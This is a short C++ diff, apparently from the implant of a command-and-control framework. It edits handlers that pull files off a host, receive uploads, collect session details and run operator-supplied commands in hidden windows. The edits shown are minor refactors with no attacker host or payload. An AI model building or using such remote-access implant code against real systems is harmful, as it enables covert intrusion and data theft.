@@ -323,7 +323,7 @@ auto DECLFN Task::Download(
 
     KhDbg("Download file path: %s", FilePath);
 
-    HANDLE FileHandle = Self->Krnl32.CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
+    HANDLE FileHandle = Self->Krnl32.CreateFileA( FilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
 
     if ( FileHandle == INVALID_HANDLE_VALUE ) {
         CHAR* ErrorMsg = "Failed to open file for reading";
@@ -559,7 +559,7 @@ auto DECLFN Task::Upload(
                 ChunkNumber, TotalChunks, bytesWritten, FileID);
 
             if ( ChunkNumber == TotalChunks || ChunkSize < KH_CHUNK_SIZE ) {
-                KhDbg(
+                QuickMsg(
                     "Upload completed: %s (%d bytes total)", 
                     FileID, Self->Tsp->Up[FileIndex].BytesReceived 
                 );
@@ -622,7 +622,6 @@ auto DECLFN Task::Info(
 
     // session
     Self->Pkg->Str( Package, Self->Session.AgentID );
-    Self->Pkg->Str( Package, Self->Session.ImageName );
     Self->Pkg->Str( Package, Self->Session.ImagePath );
     Self->Pkg->Str( Package, Self->Session.CommandLine );
     Self->Pkg->Int32( Package, Self->Session.ProcessID );
@@ -2565,6 +2564,7 @@ auto DECLFN Task::Process(
     BOOL     Success     = FALSE;
 
     KhDbg( "sub command id: %d", SbCommandID );
+    Self->Jbs->CurrentSubId = SbCommandID;
 
     Self->Pkg->Byte( Package, SbCommandID );
 
@@ -2576,7 +2576,6 @@ auto DECLFN Task::Process(
             WCHAR*              CommandLine = Self->Psr->Wstr( Parser, &TmpVal );
             PROCESS_INFORMATION PsInfo      = { 0 };
 
-            KhDbg("start to run: %s", CommandLine);
             KhDbg("start to run: %S", CommandLine);
 
             Success = Self->Ps->Create( CommandLine, TRUE, CREATE_NO_WINDOW, &PsInfo );
@@ -2589,7 +2588,7 @@ auto DECLFN Task::Process(
                 Self->Pkg->Bytes( Package, (UCHAR*)Self->Ps->Out.p, Self->Ps->Out.s );
                 hFree( Self->Ps->Out.p );
                 Self->Ps->Out.p = nullptr;
-            } 
+            }
             
             break;
         }
